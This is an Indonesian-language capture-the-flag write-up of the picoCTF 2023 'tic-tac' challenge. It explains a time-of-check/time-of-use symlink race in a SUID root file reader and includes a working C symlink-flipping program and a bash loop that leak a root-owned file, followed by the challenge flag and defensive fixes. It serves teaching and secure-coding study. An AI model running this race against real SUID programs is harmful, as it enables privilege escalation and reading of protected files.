# 380 - tic-tac (Binary Exploitation, picoCTF 2023, Medium)

## Challenge Metadata
- ID: 380 | Event: picoCTF 2023 | Author: CyLab Academy / picoCTF
- Category: Binary Exploitation | Difficulty: Medium (3) | Points: 300
- Flag: `academy{ToctoU_!s_3a5y_f506ee91}`

## Problem Statement & Scope
Tantangan menyediakan akses remote terminal interaktif via SSH (`ctf-player@xebec.cylabacademy.net:port`). Di dalam direktori pengguna terdapat biner SUID root bernama `txtreader` dan berkas sumber `src.cpp`. Berkas rahasia sistem `flag.txt` dimiliki oleh root dengan izin ketat `-rw------- 1 root root`. Biner dirancang untuk menolak pembacaan file yang bukan milik pengguna yang sedang mengeksekusi program.

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Analisis Kode Sumber `src.cpp`:**
   Mekanisme pembacaan file dan validasi kepemilikan diimplementasikan sebagai berikut:
   ```cpp
   std::string filename = argv[1];
   std::ifstream file(filename); // [1] Operasi pembukaan file (Time-of-Use)
   struct stat statbuf;

   // [2] Operasi pemeriksaan status metadata file (Time-of-Check)
   if (stat(filename.c_str(), &statbuf) == -1) {
       std::cerr << "Error: Could not retrieve file information" << std::endl;
       return 1;
   }

   // [3] Validasi kepemilikan file terhadap real UID pengguna
   if (statbuf.st_uid != getuid()) {
       std::cerr << "Error: you don't own this file" << std::endl;
       return 1;
   }

   // [4] Pembacaan isi file melalui stream yang telah dibuka di awal
   if (file.is_open()) {
       std::string line;
       while (getline(file, line)) {
           std::cout << line << std::endl;
       }
   }
   ```
2. **Kelemahan Asosiasi Non-Atomik (TOCTOU Inversion):**
   - Biner berjalan dengan SUID root (`-rwsr-xr-x 1 root root`). Ketika baris `std::ifstream file(filename)` dieksekusi, kernel membuka file menggunakan *Effective UID* proses (root / UID 0). Oleh karena itu, file apapun termasuk `/root/flag.txt` dapat berhasil dibuka (*file descriptor allocated*).
   - Validasi kepemilikan file (`stat(filename.c_str(), &statbuf)`) baru dilakukan *setelah* file dibuka dan memeriksa path string filename, bukan file descriptor yang sedang terbuka (tidak menggunakan `fstat`).
3. **Symlink Race Condition Window:**
   Jika sebuah symbolic link (`link`) di-swap secara repetitif pada frekuensi tinggi antara `flag.txt` (milik root) dan `dummy` (milik user biasa / UID 1000):
   - Pada interval mikrodetik $T_1$: Biner membuka file saat `link` mengarah ke `flag.txt` (pembukaan sukses sebagai root).
   - Pada interval mikrodetik $T_2$: Symlink berganti mengarah ke `dummy`. Fungsi `stat("link", ...)` mengevaluasi `dummy`, mendapati `statbuf.st_uid == 1000` (`getuid()`), sehingga validasi keamanan lolos.
   - Pada interval $T_3$: Loop pembacaan mencetak konten dari stream `file` yang telah terbuka sejak $T_1$ (yaitu isi asli `flag.txt`).

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Izin & SUID Bit:**
   ```bash
   ls -la
   # -rw------- 1 root       root          32 Sep 23 04:40 flag.txt
   # -rwsr-xr-x 1 root       root       24520 Sep 23 04:40 txtreader
   ```
2. **Pembuatan Utilitas Race Condition Berkecepatan Tinggi (C):**
   Untuk memaksimalkan frekuensi pertukaran tautan tanpa latensi shell interpreter, disusun program C lokal:
   ```c
   #include <unistd.h>
   int main() {
       while (1) {
           unlink("link");
           symlink("flag.txt", "link");
           unlink("link");
           symlink("dummy", "link");
       }
       return 0;
   }
   ```
3. **Kompilasi dan Eksekusi Concurrency Loop:**
   Menjalankan program flipper di latar belakang dan memicu biner SUID berulang kali:
   ```bash
   echo "dummy" > dummy
   gcc -O2 race.c -o race
   ./race &
   RPID=$!
   for i in $(seq 1 1000); do
       out=$(./txtreader link 2>/dev/null)
       if [[ "$out" =~ "academy{" ]]; then
           echo "FLAG: $out"
           break
       fi
   done
   kill -9 $RPID
   ```
4. **Hasil Ekstraksi Token:**
   Dalam beberapa ratus iterasi (<1 detik), race window berhasil terpukul dan token dicetak:
   `academy{ToctoU_!s_3a5y_f506ee91}`.

## Flag & Verifikasi
- **Flag Resmi:** `academy{ToctoU_!s_3a5y_f506ee91}`
- **Bukti Validasi REST API:** `POST /api/submissions/` mengembalikan `HTTP 201 Created` dengan `correct: true`.

## Takeaway Kompetensi LKS & Mitigasi Defensif
1. **Penerapan Operasi File Berbasis Descriptor Atomik (`fstat` & `O_NOFOLLOW`):**
   Untuk mencegah serangan TOCTOU symlink:
   - Hindari validasi path string secara terpisah dari operasi pembukaan file.
   - Buka file menggunakan panggilan sistem tingkat rendah `open()` dengan flag proteksi `O_NOFOLLOW` (menolak traversal symbolic link).
   - Validasi kepemilikan dan metadata secara atomik pada *file descriptor* yang sudah terbuka menggunakan `fstat(fd, &statbuf)`, bukan `stat(path, ...)`.
2. **Drop Privileges Permanen / Sementara (Effective UID Management):**
   Program SUID harus selalu menurunkan hak istimewa (*drop privilege*) ke real UID pengguna (`seteuid(getuid())`) saat membuka berkas atas nama pengguna unprivileged. Akses root hanya diaktifkan secara selektif saat benar-benar dibutuhkan oleh operasi kernel tertentu.
3. **Relevansi Modul LKS:**
   Esensial untuk kategori Linux Binary Exploitation, SUID Vulnerability Analysis, dan Secure Systems Programming pada standar lomba LKS Cyber Security Nasional dan NIST SP 800-115.
